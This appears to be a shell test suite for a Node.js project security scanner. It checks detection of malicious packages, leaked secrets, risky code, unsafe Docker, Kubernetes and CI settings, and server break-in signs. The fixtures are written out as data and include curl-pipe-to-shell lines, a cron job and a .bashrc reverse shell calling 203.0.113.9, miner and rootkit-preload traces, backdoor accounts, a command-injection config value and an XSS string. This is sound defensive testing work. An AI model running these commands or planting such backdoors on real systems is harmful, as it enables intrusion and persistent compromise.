t "OSV: malicious package is an alert"       1 "OSV lists this package version as MALICIOUS: evil-pkg@1.0.0" ""     --only packages --pm bun p/osv
t "OSV: the alert links to the record"       1 "https://osv.dev/vulnerability/MAL-2026-4242" "left-pad@1.3.0  (https"  --only packages --pm bun p/osv
t "OSV: --no-osv skips it"                   0 "Skipped (--no-network or --no-osv)" "MALICIOUS"                     --only packages --pm bun --no-osv p/osv
t "OSV: --quick skips it"                    0 "RESULT: PASS" "OSV"                                                 --only packages --pm bun --quick p/osv
ENVS="CURL_FIX=$T/osv-vuln"
t "OSV: ordinary vulnerabilities aren't alerts" 0 "OSV also lists 2 ordinary vulnerability record(s)" "[ALERT]"     --only packages --pm bun p/osv
ENVS="CURL_FIX=$T/osv-fail"
t "OSV: no answer is reported, not a pass"   0 "Couldn't get an answer from the OSV database" ""                    --only packages --pm bun p/osv
t "OSV: no answer with --strict"             3 "RESULT: NOT COMPLETE" ""                                            --only packages --pm bun --strict p/osv
ENVS=""
# 1,200 packages need three requests of at most 500 each.
proj osv-big; { i=1; while [ "$i" -le 1200 ]; do printf '"pkg-%s": ["pkg-%s@1.0.0", "", {}, "sha512-x"],\n' "$i" "$i"; i=$((i + 1)); done; } > p/osv-big/bun.lock
t "OSV: large lockfile is sent in batches"   0 "OSV lists none of the 1200 package versions as malicious" ""        --only packages --pm bun p/osv-big
echo "pkg-777" > osv-mal/osv-mal; ENVS="CURL_FIX=$T/osv-mal"
t "OSV: a hit in a later batch is found"     1 "MALICIOUS: pkg-777@1.0.0" ""                                        --only packages --pm bun p/osv-big
echo "evil-pkg" > osv-mal/osv-mal; ENVS=""

group "Registry checks (--deep)"
TODAY_ISO="$(date +%Y-%m-%d)T00:00:00.000Z"
cat > bin/fakenpm <<EOF
#!/bin/sh
case "\$1 \$2" in
  "audit signatures") if [ -f "\$NPM_FIX/badsig" ]; then echo '{"invalid":[{"name":"x"}],"missing":[]}'; elif [ -f "\$NPM_FIX/sigfail" ]; then echo '{"error":{"summary":"Failed to download"}}'; else echo '{"invalid":[],"missing":[]}'; fi ;;
  "audit --json") echo '{"auditReportVersion":2,"vulnerabilities":{},"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":0,"critical":0,"total":0}}}' ;;
  view\ *)
    case "\$2" in
      old-thing*) echo '{"name":"old-thing","version":"1.0.0","time":{"created":"2015-01-01T00:00:00.000Z","modified":"${TODAY_ISO}","1.0.0":"2015-01-01T00:00:00.000Z"}}' ;;
      gone-thing*) echo '{"name":"gone-thing","version":"2.0.0","deprecated":"use something-else instead","time":{"2.0.0":"${TODAY_ISO}","1.0.0":"2024-01-01T00:00:00.000Z"}}' ;;
      fresh-thing*) echo '{"name":"fresh-thing","version":"3.0.0","time":{"3.0.0":"${TODAY_ISO}"}}' ;;
      *) echo '{"name":"left-pad","version":"1.3.0","time":{"1.3.0":"2025-06-01T00:00:00.000Z"}}' ;;
    esac ;;
esac
exit 0
EOF
chmod +x bin/fakenpm; mkdir -p bin/reg npm-badsig npm-sigfail; cp bin/fakenpm bin/reg/npm; cp bin/ok/curl bin/reg/curl; touch npm-badsig/badsig npm-sigfail/sigfail
mkdir -p p/reg; put p/reg/package.json '{
  "name": "reg",
  "dependencies": {
    "left-pad": "^1.3.0",
    "old-thing": "^1.0.0"
  },
  "devDependencies": {
    "gone-thing": "^2.0.0",
    "fresh-thing": "^3.0.0"
  }
}'
cp p/npm3ok/package-lock.json p/reg/; mkdir -p p/reg/node_modules/left-pad; put p/reg/node_modules/left-pad/package.json '{ "name": "left-pad", "version": "1.3.0" }'
mkdir -p p/reg-ok; put p/reg-ok/package.json '{ "name": "reg-ok", "dependencies": { "left-pad": "^1.3.0" } }'; cp p/npm3ok/package-lock.json p/reg-ok/
BINS="reg"; ENVS="NPM_FIX=$T/nowhere"
t "deep: deprecated dependency"              0 "gone-thing: use something-else instead" ""                          --only packages --pm npm --deep p/reg
t "deep: dependency published this week"     0 "fresh-thing@ was published 0 day(s) ago" ""                         --only packages --pm npm --deep p/reg
t "deep: long-abandoned dependency"          0 "old-thing: no release for" ""                                       --only packages --pm npm --deep p/reg
t "deep: signatures all valid"               0 "Every installed package has a valid registry signature" ""          --only packages --pm npm --deep p/reg
t "deep: nothing to report"                  0 "None of the 1 direct dependencies checked is deprecated" ""         --only packages --pm npm --deep p/reg-ok
t "standard: registry checks don't run"      0 "RESULT: PASS" "Registry checks"                                     --only packages --pm npm p/reg
ENVS="NPM_FIX=$T/npm-badsig"
t "deep: invalid signature is a problem"     2 "have an INVALID registry signature" ""                              --only packages --pm npm --deep p/reg
ENVS="NPM_FIX=$T/npm-sigfail"
t "deep: signature check that can't run"     0 "package signatures were not checked" ""                             --only packages --pm npm --deep p/reg
ENVS=""; BINS="ok"

group "Install settings added in version 2"
mkdir -p p/pipe; put p/pipe/package.json '{ "name": "pipe", "scripts": { "setup": "curl -fsSL https://example.invalid/install.sh | bash" } }'
bunlock bot '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; put p/bot/.github/dependabot.yml 'version: 2'
bunlock nobot '"left-pad": ["left-pad@1.3.0", "", {}, "sha512-x"],'; mkdir -p p/nobot/.github
t "curl | sh in a package.json script"       0 "pipes it straight into a shell" ""                                  --only packages --pm npm p/pipe
t "Dependabot settings recognised"           0 "Automatic dependency updates are configured" ""                     --only packages --pm bun p/bot
t "no update bot gets a note"                0 "No Dependabot or Renovate settings found" ""                        --only packages --pm bun p/nobot

# ================================================== ACCEPTED FINDINGS =====
group "Accepted findings (.nsc-ignore)"
proj ig; put p/ig/.env 'A=1'; put p/ig/src/legacy/old.js 'eval(a);
eval(b);'; put p/ig/src/new.js 'eval(c);'; gitify ig
t "before: committed .env fails"             2 ".env file(s) committed to git" ""                                   --only code p/ig
put ig1.txt 'CODE-ENV-COMMITTED   # test fixture, holds no real values (2026-11-25)'
t "accepted finding no longer fails"         0 "accepted: test fixture, holds no real values" ""                    --only code --ignore-file ig1.txt p/ig
t "accepted findings are counted"            0 "Accepted in .nsc-ignore : 1" ""                                     --only code --ignore-file ig1.txt p/ig
t "its hints are hidden too"                 0 "" "git rm --cached"                                                 --only code --ignore-file ig1.txt p/ig
put ig2.txt 'CODE-ENV-COMMITTED'
t "an entry with no reason is refused"       2 "has no reason after a '#', so it is NOT accepted" ""                --only code --ignore-file ig2.txt p/ig
put ig3.txt 'CODE-ENV-COMMITTED # fixture
CODE-EVAL src/legacy/*   # old admin tool, input never comes from visitors'
t "path entry hides only those files"        0 "eval() or new Function(): 1 line (2 more accepted in .nsc-ignore)" "src/legacy" --only code --ignore-file ig3.txt p/ig
put ig4.txt 'CODE-*   # everything in the code part is accepted for this test'
t "ID ending in * accepts a whole group"     0 "RESULT: PASS." "[WARN]"                                             --only code --ignore-file ig4.txt p/ig
put ig5.txt 'PKG-IOC  # we know
PKG-*    # all of it'
t "compromise alerts can't be accepted"      1 "Known-malicious version in the lockfile" ""                         --only packages --pm bun --ignore-file ig5.txt p/top
cp ig1.txt p/ig/.nsc-ignore
t ".nsc-ignore in the project is used"       0 "Accepted findings: 1 from" ""                                       --only code p/ig
rm -f p/ig/.nsc-ignore
put ig6.txt 'not an id!!   # reason'
t "a line that isn't an ID is reported"      2 "is not a finding ID" ""                                             --only code --ignore-file ig6.txt p/ig
t "findings show their ID"                   2 "(CODE-ENV-COMMITTED)" ""                                            --only code p/ig

# ====================================================== SAVED ANSWERS =====
group "Saved answers (.nsc.conf) and thoroughness"
proj cf; cp p/pnpm9ok/pnpm-lock.yaml p/cf/; cp p/clean/bun.lock p/cf/
put p/cf/.nsc.conf '# saved
pm = pnpm
level = quick
server = dev
url = none'
t "saved answers are used"                   0 "Package manager  : pnpm" ""                                         --only packages p/cf
t "it says where they came from"             0 "Using saved answers from" ""                                        --only packages p/cf
t "saved thoroughness is used"               0 "Thoroughness     : quick" ""                                        --only packages p/cf
t "the command line wins over saved answers" 0 "Package manager  : bun" ""                                          --only packages --pm bun p/cf
t "--ask ignores the saved answers"          0 "Package manager  : bun" "Using saved answers"                       --only packages --ask p/cf
proj cf-bad; cp p/clean/bun.lock p/cf-bad/; put p/cf-bad/.nsc.conf 'pm = $(touch '"$T"'/pwned)
server = dev'
t "saved answers are data, never run"        3 "--pm must be" ""                                                    --only packages p/cf-bad
if [[ ! -e "$T/pwned" ]]; then PASS=$((PASS + 1)); echo "ok    nothing in the saved answers was executed"; else FAIL=$((FAIL + 1)); echo "FAIL  nothing in the saved answers was executed"; fi
proj cf-save; cp p/clean/bun.lock p/cf-save/
t "--save-config writes the file"            0 "Answers saved to" ""                                                --only packages --pm bun --quick --save-config p/cf-save
if grep -q '^pm = bun$' p/cf-save/.nsc.conf 2>/dev/null && grep -q '^level = quick$' p/cf-save/.nsc.conf; then PASS=$((PASS + 1)); echo "ok    the saved file holds the answers"; else FAIL=$((FAIL + 1)); echo "FAIL  the saved file holds the answers"; fi
t "the next run reads it back"               0 "Thoroughness     : quick" ""                                        --only packages p/cf-save
t "--quick"                                  0 "Thoroughness     : quick" "Installed packages"                      --only packages --pm bun --quick p/clean
t "--deep"                                   0 "Thoroughness     : deep" ""                                         --only packages --pm bun --deep --no-network p/clean
t "standard is the default"                  0 "Thoroughness     : standard" ""                                     --only packages --pm bun p/clean

# ============================================================ REPORTS =====
group "Reports: JSON, Markdown, web page, comparison"
proj rp; put p/rp/Dockerfile 'FROM node:22 AS <b>bad</b>
FROM some/<script>alert(1)</script>
FROM odd/"quoted"\\name
CMD ["node", "x.js"]'; put p/rp/src/a.js 'eval("x \"quoted\" \\ back");'; gitify rp
t "reports are written"                      0 "JSON report saved to" ""                                            --only code --json "$T/r1.json" --markdown "$T/r1.md" --html "$T/r1.html" p/rp
chk() { if "$@" >/dev/null 2>&1; then PASS=$((PASS + 1)); echo "ok    $CHK"; else FAIL=$((FAIL + 1)); echo "FAIL  $CHK"; fi; }
CHK="JSON report is valid JSON with the expected fields"
chk node -e 'const r=JSON.parse(require("fs").readFileSync(process.argv[1],"utf8")); if(r.tool!=="node-security-check"||r.result!=="pass"||r.exit_code!==0||!Array.isArray(r.findings)||r.counts.warn<2) process.exit(1); const f=r.findings.find(x=>x.id==="CODE-EVAL"); if(!f||f.level!=="warn"||f.part!=="code"||!f.details.some(d=>d.includes("src/a.js:1"))) process.exit(1); if(!r.findings.some(x=>x.message.includes("<script>alert(1)</script>"))) process.exit(1); if(!r.findings.some(x=>x.message.includes("odd/\"quoted\"\\\\name"))) process.exit(1);' "$T/r1.json"
CHK="Markdown report has the sections and the finding"
chk grep -q '^- \*\*WARN\*\* `CODE-EVAL` eval() or new Function(): 1 line' "$T/r1.md"
CHK="Markdown report has a result line"
chk grep -q '^- \*\*Result:\*\* PASS, with' "$T/r1.md"
CHK="web page report has the finding"
chk grep -q 'CODE-DOCKER-TAG' "$T/r1.html"
CHK="web page report escapes text taken from files"
chk grep -q '&lt;script&gt;alert(1)&lt;/script&gt;' "$T/r1.html"
if grep -q '<script>alert' "$T/r1.html" "$T/r1.md"; then FAIL=$((FAIL + 1)); echo "FAIL  no live script tag in the web page or Markdown report"; else PASS=$((PASS + 1)); echo "ok    no live script tag in the web page or Markdown report"; fi
# Second run: one problem fixed, one new.
put p/rp/src/a.js 'console.log(1);'; put p/rp/src/b.js 'const h = crypto.createHash("md5");'; put p/rp/.env 'A=1'; gitify2() { ( cd "p/$1" && git add -A && git -c user.name=test -c user.email=test@example.invalid commit -q -m more ) >/dev/null 2>&1; }; gitify2 rp
t "compare: what is new"                     2 "New: 2    Fixed: 1" ""                                              --only code --compare "$T/r1.json" p/rp
t "compare: the new finding is named"        2 "MD5 or SHA-1 hashing: 1 line  (CODE-WEAK-HASH)" ""                  --only code --compare "$T/r1.json" p/rp
t "compare: the fixed finding is named"      2 "eval() or new Function(): 1 line  (CODE-EVAL)" ""                   --only code --compare "$T/r1.json" p/rp
t "compare and --json can use the same file" 2 "JSON report saved to" ""                                            --only code --compare "$T/r1.json" --json "$T/r1.json" p/rp
t "compare: nothing changed"                 2 "New: 0    Fixed: 0" ""                                              --only code --compare "$T/r1.json" p/rp
echo '{"something":"else"}' > "$T/other.json"
t "compare: a file from something else"      2 "not a report from this script" ""                                   --only code --compare "$T/other.json" p/rp
t "compare: missing file"                    3 "not found" ""                                                       --only code --compare "$T/nope.json" p/rp
CHK="JSON of a failing run records the result"
chk node -e 'const r=JSON.parse(require("fs").readFileSync(process.argv[1],"utf8")); if(r.result!=="fail"||r.exit_code!==2||r.counts.high!==1) process.exit(1);' "$T/r1.json"

# =============================================================== CODE =====
group "Code: secrets in git history, build output and public variables"
proj hs; put p/hs/config.js "const key = '${AK}';"; gitify hs
put p/hs/config.js 'const key = process.env.AWS_KEY;'; gitify2 hs
t "standard: a removed secret isn't seen"    0 "No secrets matched the known patterns" "history"                    --only code p/hs
t "--history finds it in an old commit"      2 "Secret-looking text in 1 place(s) in the git history" "${AK}"       --only code --history p/hs
t "--history shows file and commit"          2 "config.js:" ""                                                      --only code --history p/hs
t "--deep scans history too"                 2 "in the git history" ""                                              --only code --deep --no-tools p/hs
t "clean history"                            0 "anywhere in the git history" "[HIGH]"                               --only code --history p/c-clean
put hs-ig.txt 'CODE-HISTORY-SECRET config.js   # key rotated on 2026-11-25'
t "a rotated secret can be accepted"         0 "RESULT: PASS" ""                                                    --only code --history --ignore-file hs-ig.txt p/hs

proj bo; put p/bo/.gitignore 'dist'; put p/bo/src/a.js 'x'; gitify bo
put p/bo/dist/assets/app.js "var k='${GH}';"; put p/bo/dist/assets/app.js.map '{"sources":[]}'
proj bo-ok; put p/bo-ok/dist/app.js 'var k=1;'
proj pe; put p/pe/src/a.js 'const s = process.env.NEXT_PUBLIC_API_SECRET;'; put p/pe/.gitignore '.env'; gitify pe; put p/pe/.env 'VITE_DB_PASSWORD=x'
t "secret inside build output"               2 "Secret-looking text inside build output" "${GH}"                    --only code p/bo
t "source maps in build output"              2 "1 source map file(s) in the build output" ""                        --only code p/bo
t "clean build output"                       0 "No secrets in the build output" ""                                  --only code p/bo-ok
t "secret-named public variable"             0 "has a prefix that sends it to the browser" ""                       --only code p/pe
t "found in code and in .env"                0 ".env" ""                                                            --only code p/pe

group "Code: more secret types"
S_GL="glpat-"; S_GL="${S_GL}abcdefghij0123456789"
S_GO="GOCSPX-"; S_GO="${S_GO}abcdefghijklmnopqrstuvwxyz01"
S_WH="whsec_"; S_WH="${S_WH}abcdefghijklmnopqrstuvwx"
S_SL="https://hooks.slack.com/"; S_SL="${S_SL}services/T0000AAAA/B0000BBBB/abcdefghijklmnop"
S_HF="hf_"; S_HF="${S_HF}abcdefghijklmnopqrstuvwxyzABCDEFGH"
S_GA="AIza"; S_GA="${S_GA}SyA1234567890abcdefghijklmnopqrstuv"
S_JW="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."; S_JW="${S_JW}eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV"
S_DO="dop_v1_"; S_DO="${S_DO}$(printf 'a%.0s' $(seq 1 64))"
S_DK="dckr_pat_"; S_DK="${S_DK}abcdefghijklmnopqrstuvwx"
S_TG="1234567890:AA"; S_TG="${S_TG}abcdefghijklmnopqrstuvwxyz0123456"
proj st; put p/st/a.txt "gitlab: ${S_GL}"; put p/st/b.txt "google: ${S_GO}"; put p/st/c.txt "stripe: ${S_WH}"; put p/st/d.txt "slack: ${S_SL}"
put p/st/e.txt "hf: ${S_HF}"; put p/st/f.txt "maps: ${S_GA}"; put p/st/g.txt "token: ${S_JW}"; put p/st/h.txt "do: ${S_DO}"
put p/st/i.txt "docker: ${S_DK}"; put p/st/j.txt "bot ${S_TG}"; put p/st/k.json '{ "type": "service_account", "project_id": "x" }'; gitify st
t "GitLab and Docker Hub tokens"             2 "Developer platform token" "${S_GL}"                                 --only code p/st
t "developer tokens: both files counted"     2 "age): 2 lines" ""                                                   --only code p/st
t "Google OAuth, service account, DigitalOcean" 2 "DigitalOcean): 3 lines" ""                                       --only code p/st
t "Stripe webhook secret"                    2 "Payment key (Stripe webhook secret, Square, Shopify): 1 line" ""    --only code p/st
t "Slack webhook and Telegram bot"           2 "Telegram bot): 2 lines" ""                                          --only code p/st
t "Hugging Face token"                       2 "AI provider key" ""                                                 --only code p/st
t "Google API key is a warning, not high"    2 "[WARN] Google API key" ""                                           --only code p/st
t "JWT in a file is a warning"               2 "[WARN] A signed token (JWT) written into a file: 1 line" ""         --only code p/st
proj st-fp; put p/st-fp/a.js 'const shelf_abcdefghijklmnopqrstuvwxyzABCDEFGH = 1;
const id = "550e8400e29b41d4a716446655440000";
const s = "this_is_not_a_key";'; gitify st-fp
t "look-alikes are not reported"             0 "No secrets matched the known patterns" ""                           --only code p/st-fp

group "Code: more risky patterns"
proj c2
put p/c2/src/ssrf.js 'const r = await fetch(req.query.url);'
put p/c2/src/nosql.js 'const u = await User.findOne(req.body);'
put p/c2/src/mass.js 'await User.create(req.body);'
put p/c2/src/proto.js 'Object.assign(config, req.body);'
put p/c2/src/vm.js 'vm.runInNewContext(code, sandbox);'
put p/c2/src/cipher.js 'const c = crypto.createCipher("aes192", pw);'
put p/c2/src/kdf.js 'const h = await bcrypt.hash(pw, 4);'
put p/c2/src/jwt.js 'const t = jwt.sign(payload, "my-jwt-secret");'
put p/c2/src/session.js 'app.use(session({ secret: "keyboard cat", resave: false }));'
put p/c2/src/cookie.js 'res.cookie("sid", v, { httpOnly: false });'
put p/c2/src/err.js 'res.status(500).send(err.stack);'
put p/c2/src/log.js 'console.log("login", req.body.password);'
put p/c2/src/tpl.js 'res.render(req.query.page);'
put p/c2/src/re.js 'const re = new RegExp(req.query.q);'
put p/c2/src/static.js 'app.use(express.static(__dirname));'
put p/c2/src/gql.js 'new ApolloServer({ typeDefs, introspection: true });'
put p/c2/src/up.js 'const upload = multer({ dest: "uploads/" });'
put p/c2/src/prisma.js 'await prisma.$queryRawUnsafe(q);'
put p/c2/src/nest.js 'app.enableCors();'
gitify c2
for pair in \
  "CODE-SSRF|Outgoing request to an address taken from the incoming request: 1 line" \
  "CODE-NOSQL|Database filter taken straight from the request: 1 line" \
  "CODE-MASS-ASSIGN|Whole request body saved to the database: 1 line" \
  "CODE-PROTO|Request data merged into an object: 1 line" \
  "CODE-DESERIALISE|Code-capable deserialisation or the vm module: 1 line" \
  "CODE-WEAK-CRYPTO|Weak or outdated encryption: 1 line" \
  "CODE-WEAK-KDF|Password hashing set too low: 1 line" \
  "CODE-JWT-SECRET|JWT signed or checked with a secret written in the code: 1 line" \
  "CODE-SESSION-SECRET|Session secret written in the code, or a placeholder: 1 line" \
  "CODE-COOKIE|Cookie protections switched off: 1 line" \
  "CODE-ERROR-LEAK|Error details or stack traces sent to the visitor: 1 line" \
  "CODE-LOG-SECRET|Passwords, tokens or secrets written to the log: 1 line" \
  "CODE-TEMPLATE|Template name or template text taken from the request: 1 line" \
  "CODE-REGEX|Regular expression built from the request: 1 line" \
  "CODE-STATIC-ROOT|The whole project folder served as static files: 1 line" \
  "CODE-GRAPHQL|GraphQL introspection or playground switched on: 1 line" \
  "CODE-UPLOAD-LIMIT|File uploads (multer) with no size limits" \
  "CODE-SQL|SQL built by joining strings: 1 line" \
  "CODE-CORS|CORS open to every site: 1 line"
do
  t "pattern ${pair%%|*}"                    0 "${pair#*|}" ""                                                      --only code p/c2
done
proj c2-ok
put p/c2-ok/src/ok.js 'const r = await fetch(API_URL);
const u = await User.findOne({ email: String(req.body.email) });
await User.create({ name: body.name });
const h = await bcrypt.hash(pw, 12);
const t = jwt.sign(payload, process.env.JWT_SECRET);
app.use(session({ secret: process.env.SESSION_SECRET }));
res.cookie("sid", v, { httpOnly: true, secure: true });
res.status(500).send("Something went wrong");
console.log("login", req.body.email);
res.render("page", { q: req.query.q });
app.use(express.static(path.join(__dirname, "public")));
const upload = multer({ dest: "uploads/", limits: { fileSize: 1000000 } });
await prisma.$queryRaw`SELECT 1`;
const c = crypto.createCipheriv("aes-256-gcm", key, iv);'
gitify c2-ok
t "the safe versions are not reported"       0 "None of the risky patterns were found" "[WARN]"                     --only code p/c2-ok
t "--quick runs the core patterns only"      0 "RESULT: PASS" "CODE-SSRF"                                           --only code --quick p/c2

group "Code: framework checks added in version 2"
mkdir -p p/f-csrf; put p/f-csrf/package.json '{ "name": "x", "dependencies": { "express": "^4", "helmet": "^7", "express-session": "^1" } }'
mkdir -p p/f-nest; put p/f-nest/package.json '{ "name": "x", "dependencies": { "@nestjs/core": "^10", "helmet": "^7" } }'; put p/f-nest/src/main.ts 'const app = await NestFactory.create(AppModule);'
mkdir -p p/f-next; put p/f-next/package.json '{ "name": "x", "dependencies": { "next": "^15" } }'
put p/f-next/next.config.js 'module.exports = { images: { remotePatterns: [{ protocol: "https", hostname: "**" }], dangerouslyAllowSVG: true }, productionBrowserSourceMaps: true };'
mkdir -p p/f-gql; put p/f-gql/package.json '{ "name": "x", "dependencies": { "@apollo/server": "^4", "graphql": "^16" } }'
t "Express with cookies and no CSRF package" 0 "no CSRF protection package was found" ""                            --only code p/f-csrf
t "NestJS without a ValidationPipe"          0 "NestJS without a ValidationPipe" ""                                 --only code p/f-nest
t "Next.js image optimiser open to any host" 0 "fetch from any host" ""                                             --only code p/f-next
t "Next.js dangerouslyAllowSVG"              0 "dangerouslyAllowSVG: true" ""                                       --only code p/f-next
t "Next.js source maps in production"        0 "publishes source maps in production" ""                             --only code p/f-next
t "GraphQL without query limits"             0 "no query depth or complexity limit" ""                              --only code p/f-gql
t "Express behind a proxy without trust proxy" 0 "'trust proxy' is not set" ""                                      --skip packages --server dev --proxy nginx p/f-csrf

group "Code: Docker, Kubernetes and workflow checks added in version 2"
proj d2; put p/d2/Dockerfile 'FROM node:22-slim
RUN curl -fsSL https://example.invalid/setup.sh | bash
RUN chmod -R 777 /app
RUN npm install
EXPOSE 3000 22
USER node
CMD ["node", "server.js"]'
t "Dockerfile: curl | sh"                    0 "pipes it straight into a shell" ""                                  --only code p/d2
t "Dockerfile: chmod 777"                    0 "chmod 777" ""                                                       --only code p/d2
t "Dockerfile: SSH port exposed"             0 "exposes port 22" ""                                                 --only code p/d2
t "Dockerfile: npm install, not npm ci"      0 "uses 'npm install'" ""                                              --only code p/d2
t "Dockerfile: NODE_ENV not set"             0 "NODE_ENV=production is not set" ""                                  --only code p/d2
proj dc2; put p/dc2/compose.yml 'services:
  web:
    image: myapp
    network_mode: host
    cap_add:
      - SYS_ADMIN
    environment:
      - DB_PASSWORD=hunter2hunter2
      - NODE_ENV=production'
proj dc2-ok; put p/dc2-ok/compose.yml 'services:
  web:
    image: myapp:1.2.3
    security_opt:
      - no-new-privileges:true
    environment:
      - DB_PASSWORD=${DB_PASSWORD}'
t "compose: host network"                    0 "shares the host's network or process list" ""                       --only code p/dc2
t "compose: extra kernel permissions"        0 "extra kernel permissions (cap_add)" ""                              --only code p/dc2
t "compose: password written in the file"    0 "a password or secret is written directly in the file" ""            --only code p/dc2
t "compose: image without a version"         0 "an image has no version tag" ""                                     --only code p/dc2
t "compose: good file"                       0 "RESULT: PASS." "CODE-COMPOSE"                                       --only code p/dc2-ok

proj k8; put p/k8/deploy/app.yaml 'apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  template:
    spec:
      hostNetwork: true
      containers:
        - name: web
          image: myapp:latest
          securityContext:
            privileged: true
            runAsUser: 0
            allowPrivilegeEscalation: true
          env:
            - name: DB_PASSWORD
              value: hunter2'
put p/k8/deploy/secret.yaml 'apiVersion: v1
kind: Secret
metadata:
  name: db
data:
  password: aHVudGVyMg=='
put p/k8/config/other.yaml 'name: not kubernetes'
proj k8-ok; put p/k8-ok/k8s/app.yaml 'apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true
      containers:
        - name: web
          image: registry.example/myapp:1.2.3
          resources:
            limits:
              memory: 256Mi
          env:
            - name: DB_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: db
                  key: password'
t "Kubernetes: privileged container"         2 "a container runs privileged" ""                                     --only code p/k8
t "Kubernetes: host network"                 2 "shares the node's network" ""                                       --only code p/k8
t "Kubernetes: told to run as root"          2 "told to run as root" ""                                             --only code p/k8
t "Kubernetes: privilege escalation"         2 "allowPrivilegeEscalation is true" ""                                --only code p/k8
t "Kubernetes: latest image"                 2 "no version tag or uses 'latest'" ""                                 --only code p/k8
t "Kubernetes: password as a plain value"    2 "written as a plain env value" ""                                    --only code p/k8
t "Kubernetes: no limits, no runAsNonRoot"   2 "no resource limits" ""                                              --only code p/k8
t "Kubernetes: Secret object in the project" 2 "Secret object(s) with values in the project" ""                     --only code p/k8
t "Kubernetes: the file is named"            2 "deploy/app.yaml" "config/other.yaml"                                --only code p/k8
t "Kubernetes: good file"                    0 "RESULT: PASS." "CODE-K8S"                                           --only code p/k8-ok
t "no Kubernetes files: no section"          0 "RESULT: PASS" "Kubernetes"                                          --only code p/c-clean

proj w2; put p/w2/.github/workflows/ci.yml 'on: issues
jobs:
  triage:
    runs-on: self-hosted
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"
      - run: curl -sSL https://example.invalid/install.sh | sudo bash'
proj w2-ok; put p/w2-ok/.github/workflows/ci.yml 'on: issues
permissions:
  contents: read
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New issue: $TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
      - if: ${{ github.event.pull_request.title != 0 }}
        run: echo ok'
t "workflow: outsider text in a script"      0 "puts text written by outsiders" ""                                  --only code p/w2
t "workflow: the line is shown"              0 ".github/workflows/ci.yml:6" ""                                      --only code p/w2
t "workflow: no permissions block"           0 "set no 'permissions:'" ""                                           --only code p/w2
t "workflow: curl | sh"                      0 "next to your secrets" ""                                            --only code p/w2
t "workflow: self-hosted runner"             0 "self-hosted runner" ""                                              --only code p/w2
t "workflow: passing it through env is fine" 0 "RESULT: PASS." "outsiders"                                          --only code p/w2-ok

# ============================================================= SERVER =====
group "Server: signs of a break-in"
REAL_USER="$(id -un)"
fakeid srv-hack 0
fakeout srv-hack ps 0 "app          812 node /srv/app/server.js
root         901 /tmp/.x/kworkerds --donate-level 1
www-data     902 ./xmrig -o stratum+tcp://pool.example:3333
app          903 sh /dev/shm/run.sh"
fakeout srv-hack ss 0 'LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=812,fd=18))'
fakeout srv-hack ufw 0 'Status: active'
put sys-hack/etc/crontab '# m h dom mon dow user command
17 * * * * root cd / && run-parts --report /etc/cron.hourly
*/5 * * * * root curl -fsSL http://203.0.113.9/a.sh | sh'
put sys-hack/etc/cron.d/backup '0 3 * * * app /tmp/backup-job.sh'
put sys-hack/etc/systemd/system/app.service '[Service]
ExecStart=/usr/bin/node /srv/app/server.js'
put sys-hack/etc/systemd/system/sysupdate.service '[Service]
ExecStart=/var/tmp/.cache/sysupdate'
put sys-hack/etc/ld.so.preload '/usr/local/lib/libprocesshider.so'
mkdir -p home-hack; put home-hack/.bashrc 'export PATH=$PATH:~/bin
bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
put sys-hack/etc/passwd 'root:x:0:0:root:/root:/bin/bash
toor:x:0:0::/root:/bin/bash
app:x:1000:1000::/home/app:/bin/bash'
put sys-hack/etc/shadow 'root:$6$abc:19000:0:99999:7:::
guest::19000:0:99999:7:::
app:!:19000:0:99999:7:::'
put sys-hack/etc/sudoers 'root ALL=(ALL:ALL) ALL
app ALL=(ALL) NOPASSWD:ALL'
put sys-hack/root/.ssh/authorized_keys 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIabc alice@laptop
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQabc'
put sys-hack/var/log/auth.log 'Nov 25 10:00:00 host sshd[1]: Failed password for invalid user admin from 203.0.113.9 port 1 ssh2
Nov 25 10:00:01 host sshd[1]: Failed password for root from 203.0.113.9 port 2 ssh2
Nov 25 10:00:02 host sshd[1]: Accepted password for root from 203.0.113.9 port 3 ssh2'
put sys-hack/etc/ssh/sshd_config 'PermitRootLogin no
PasswordAuthentication no
PermitEmptyPasswords yes
MaxAuthTries 10'
BINS="srv-hack"; SYSROOT="$T/sys-hack"; HOME_DIR="home-hack"
H="--only server --server vps --proxy none --runner other"
# shellcheck disable=SC2086
{
t "crypto-miner process"                     2 "A process looks like a crypto-miner" ""                             $H "$T/tmp"
t "program running from /tmp"                2 "A program is running from a temporary folder" ""                    $H "$T/tmp"
t "both odd processes are listed"            2 "PID 903 (app): sh /dev/shm/run.sh" ""                               $H "$T/tmp"
t "scheduled job that downloads and runs"    2 "A scheduled job downloads and runs something" ""                    $H "$T/tmp"
t "normal scheduled job is not flagged"      2 "" "run-parts"                                                       $H "$T/tmp"
t "scheduled job from /tmp"                  2 "A scheduled job runs something from a temporary folder" ""          $H "$T/tmp"
t "service started from a hidden folder"     2 "sysupdate.service: ExecStart=/var/tmp/.cache/sysupdate" "app.service: ExecStart" $H "$T/tmp"
t "ld.so.preload"                            2 "/etc/ld.so.preload is not empty" ""                                 $H "$T/tmp"
t "login script opening a remote shell"      2 "A login script downloads and runs something" ""                     $H "$T/tmp"
t "second account with user ID 0"            2 "Account(s) other than root with full root rights" ""                $H "$T/tmp"
t "that account is named"                    2 "toor" ""                                                            $H "$T/tmp"
t "empty password"                           2 "Account(s) with an empty password" ""                               $H "$T/tmp"
t "sudo without a password"                  2 "can become root without typing a password" ""                       $H "$T/tmp"
t "SSH keys are listed with their labels"    2 "root: 2 key(s) [alice@laptop, no label]" ""                            $H "$T/tmp"
t "SSH key list changed recently"            2 "The list of SSH keys was changed in the last 7 days" ""             $H "$T/tmp"
